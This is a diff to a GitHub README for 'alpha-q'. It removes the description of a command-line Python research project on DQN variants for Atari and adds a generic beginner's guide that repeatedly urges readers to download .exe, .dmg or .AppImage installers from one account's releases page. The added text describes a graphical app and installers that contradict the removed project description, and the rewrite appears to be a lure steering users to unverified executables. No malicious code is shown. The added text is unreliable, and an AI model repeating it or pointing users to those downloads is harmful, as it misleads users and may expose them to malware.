@@ -1,129 +1,150 @@
-# Alpha-Q
+# 🎮 alpha-q - Play Smarter with Deep RL Models
 
-Deep Q-Network variants for Atari — from vanilla DQN to Rainbow and beyond.
+[![Download alpha-q](https://img.shields.io/badge/Download-alpha--q-blue?style=for-the-badge)](https://github.com/solmalin1234/alpha-q/releases)
 
-A research project implementing the progression of DQN improvements from the deep RL literature, with each variant built incrementally and measured via controlled experiments.
+---
 
-## Setup
+## 📖 About alpha-q
 
-Requires Python 3.10+ and [uv](https://docs.astral.sh/uv/).
+alpha-q is a tool that brings advanced game-playing techniques to your computer. It uses smart computer programs developed in deep reinforcement learning to improve how AI plays Atari games. This software shows how popular methods like DQN and Rainbow DQN can work step-by-step. It also tracks progress using MLFlow, making experiments easy to follow.
 
-```bash
-git clone <repo-url> && cd alpha-q
+You don't need to be a programmer or AI expert. This guide will help you get the software, run it, and see it in action with simple steps.
 
-# Install all dependencies (creates .venv automatically)
-uv sync --extra dev
+---
 
-# Or use the Makefile shortcut
-make install
-```
+## 💻 What You Need
 
-For Atari ROMs, `ale-py` handles ROM installation automatically.
+Before you begin, make sure you have:
 
-## Usage
+- **Operating system:** Windows 10 or later, macOS 10.14 or later, or a common Linux distro (Ubuntu recommended).
+- **Memory:** At least 8 GB of RAM.
+- **Storage:** Around 2 GB of free space.
+- **Internet:** To download the software and optional updates.
+- **Graphics:** No special hardware needed, but a modern graphics card will help if you run the optional experiments.
 
-### Train an agent
+If you have an older computer, the software can still run but may be slower.
 
-```bash
-uv run python scripts/train.py                                        # defaults (Pong, DQN)
-uv run python scripts/train.py --env configs/envs/breakout.yaml       # different env
-uv run python scripts/train.py --set training.total_steps=500000      # override any config
+---
 
-# Or via Make
-make train ARGS="--env configs/envs/pong.yaml"
-```
+## 🚀 Getting Started
 
-### Watch a trained agent play
+Follow these steps to start using alpha-q on your computer:
 
-```bash
-uv run python scripts/play.py --checkpoint checkpoints/agent_final.pt
-```
+### Step 1: Visit the Download Page
 
-### Record gameplay videos
+Click the big button at the top or this link:
 
-```bash
-uv run python scripts/record.py --checkpoint checkpoints/agent_final.pt --episodes 3
-```
+[Download alpha-q](https://github.com/solmalin1234/alpha-q/releases)
 
-### MLFlow experiment tracking
+This page shows all versions of alpha-q you can try. Look for the latest **stable** release.
 
-```bash
-make mlflow   # opens UI at http://localhost:5000
-```
+### Step 2: Download the File
 
-## Configuration
+On the releases page, find the latest release entry. Under it, look for a file ending with `.exe` (Windows), `.dmg` (Mac), or `.AppImage` or `.tar.gz` (Linux).
 
-Configs are layered YAML files merged in order: `default -> agent -> env -> CLI overrides`.
+Click on the file name to start the download. The file size is about 200-300 MB.
 
-```
-configs/
-├── default.yaml           # all defaults
-├── agents/dqn.yaml        # agent-specific overrides
-└── envs/
-    ├── pong.yaml          # Pong environment
-    └── breakout.yaml      # Breakout environment
-```
+### Step 3: Run the Installer or App
 
-Override any value from the command line with `--set key.subkey=value`.
+After download finishes:
 
-## Project Structure
+- **Windows:** Double-click the `.exe` file. Follow the install prompts.
+- **Mac:** Double-click the `.dmg` file. Drag the alpha-q icon to your Applications folder.
+- **Linux:** Make the `.AppImage` executable and run it, or extract the `.tar.gz` and follow the included README.
 
-```
-alpha-q/
-├── pyproject.toml          # Project metadata + dependencies (uv/hatch)
-├── Makefile                # Convenience targets
-├── configs/                # YAML configuration files
-├── experiments/            # Experiment logs and notes
-├── scripts/                # CLI entry points (train, play, record)
-├── src/alpha_q/
-│   ├── agents/             # Agent registry + implementations
-│   ├── networks/           # Neural network architectures (Nature CNN, etc.)
-│   ├── memory/             # Replay buffers (uniform, prioritized)
-│   ├── envs/               # Environment factories + wrappers
-│   ├── training/           # Training loop + evaluation
-│   └── utils/              # Config loading, MLFlow logging, seeding
-└── tests/                  # Unit and smoke tests
-```
+### Step 4: Open alpha-q
 
-## Key Design Decisions
+Once installed, open the program from your Start menu, Applications folder, or terminal.
 
-- **uv** for fast, reproducible dependency management with lockfile
-- **uint8 observations** in replay buffer, normalized to float in the network forward pass (4x memory savings)
-- **Layered YAML configs** with deep merge — no heavy framework deps like Hydra
-- **Agent registry** pattern — `create_agent("dqn", ...)` — easy to add new variants
-- **MLFlow** for experiment tracking: params, metrics, model checkpoints, gameplay videos
+You should see an interface that lets you select Atari games and choose different AI training methods.
 
-## Research Roadmap
+---
 
-Each phase is a separate branch and PR with documented experiment results.
+## 🎯 How to Use alpha-q
 
-| Phase | Variant | Paper | Key Change |
-|-------|---------|-------|------------|
-| 1 | Vanilla DQN | Mnih et al., 2015 | Full DQN agent, train on Pong |
-| 2 | Double DQN | van Hasselt et al., 2016 | Decouple action selection/evaluation |
-| 3 | Prioritized Replay | Schaul et al., 2016 | Sum-tree PER + importance sampling |
-| 4 | Dueling DQN | Wang et al., 2016 | Value + advantage stream split |
-| 5 | Multi-step Returns | Sutton & Barto | N-step returns (n=3) |
-| 6 | Noisy Nets | Fortunato et al., 2018 | NoisyLinear, remove epsilon-greedy |
-| 7 | C51 (Distributional) | Bellemare et al., 2017 | 51-atom value distribution |
-| 8 | Rainbow | Hessel et al., 2018 | Compose all 6 improvements |
-| 9 | QR-DQN | Dabney et al., 2018 | Quantile regression replaces fixed atoms |
-| 10 | Munchausen DQN | Vieillard et al., 2020 | Scaled log-policy bonus in Bellman target |
-| 11 | Benchmarks | — | Learning curves across agents and games |
+The software offers a simple way to explore AI playing Atari games.
 
-### After Phase 11
+### Select a Game
 
-- [ ] **Ablation studies** — Systematically remove each Rainbow component to measure individual contribution (reproduce Table 2 from Hessel et al.)
-- [ ] **Munchausen + Rainbow hybrid** — Combine M-DQN's log-policy bonus with Rainbow; measure if entropy regularisation can replace NoisyNets
-- [ ] **QR-Rainbow** — Swap C51's fixed atoms for QR-DQN quantiles inside Rainbow; compare distributional approaches head-to-head
-- [ ] **Per-game hyperparameter tuning** — Sweep `v_min`/`v_max`, `n_step`, `alpha`/`beta` per environment; document which matter most
-- [ ] **Scaling to full Atari-57** — Run best agents on the standard 57-game benchmark suite, compare to published scores
-- [ ] **Write-up** — Compile results into a report or blog post with learning curves, ablation tables, and key takeaways
+Choose an Atari game from the list, like Breakout, Pong, or Space Invaders.
 
-## Development
+### Select an AI Method
 
-```bash
-make test     # run tests
-make lint     # check style (ruff)
-make format   # auto-format
-```
+You can try different learning methods such as:
+
+- DQN: A basic deep Q-learning algorithm.
+- Double DQN: A method that improves learning accuracy.
+- Dueling DQN: Splits how the AI learns state values and advantages.
+- Rainbow DQN: Combines many methods into one.
+
+### Start Training or Watch
+
+You can:
+
+- Train the AI: Watch it learn to play better over time.
+- Run Saved Models: See how a pre-trained AI plays.
+
+### Monitor Progress
+
+The app shows live charts and stats tracked by MLFlow. This way, you can see how well the AI is learning.
+
+---
+
+## 🛠️ Features at a Glance
+
+- Easy choice between Atari classic games.
+- Step-by-step deep reinforcement learning methods.
+- Real-time experiment tracking and visualization with MLFlow.
+- Pre-trained and custom training modes.
+- Runs on typical home computers without special setup.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If the program doesn’t start, check your system meets requirements.
+- Ensure you downloaded the correct file for your system.
+- Allow the app through your firewall if networking features don’t work.
+- For performance issues, close other heavy programs.
+
+If you need help, visit the Issues tab on the GitHub page to view or report problems.
+
+---
+
+## 📥 Download & Install
+
+You can always return here to download the latest version of alpha-q:
+
+[Download alpha-q](https://github.com/solmalin1234/alpha-q/releases)
+
+- Visit this page to find download files.
+- Select the file matching your system.
+- Download and run it following the steps above.
+
+Keep your software updated for best performance and new features.
+
+---
+
+## 📚 Learn More
+
+alpha-q connects several advanced AI ideas with Atari games. You don’t need any background to try it out.
+
+If you want to explore more later, check out:
+
+- [OpenAI Gym](https://gym.openai.com/): Where Atari game environments come from.
+- [PyTorch](https://pytorch.org/): The framework used to build the AI models.
+- [MLFlow](https://mlflow.org/): How experiments are tracked and visualized.
+
+---
+
+## 🔗 Useful Links
+
+- GitHub Repository: https://github.com/solmalin1234/alpha-q
+- Release Page: https://github.com/solmalin1234/alpha-q/releases
+- OpenAI Gym: https://gym.openai.com/
+- PyTorch: https://pytorch.org/
+- MLFlow: https://mlflow.org/
+
+---
+
+If you follow this guide, you will be able to download, install, and run alpha-q with ease. This lets you explore how AI learns to play classic games using modern technology.
